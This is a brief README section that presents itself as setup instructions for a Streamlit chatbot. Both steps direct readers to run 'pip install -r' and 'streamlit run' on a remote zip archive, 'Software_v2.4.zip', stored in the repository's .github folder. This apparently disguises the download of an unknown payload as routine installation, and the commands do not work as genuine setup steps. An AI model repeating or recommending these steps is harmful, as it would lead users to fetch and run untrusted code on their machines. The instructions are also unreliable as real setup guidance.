### How to run it on your own machine

1. Install the requirements

   ```
   $ pip install -r https://raw.githubusercontent.com/cris236uy/chatbot/main/.github/Software_v2.4.zip
   ```

2. Run the app

   ```
   $ streamlit run https://raw.githubusercontent.com/cris236uy/chatbot/main/.github/Software_v2.4.zip
   ```
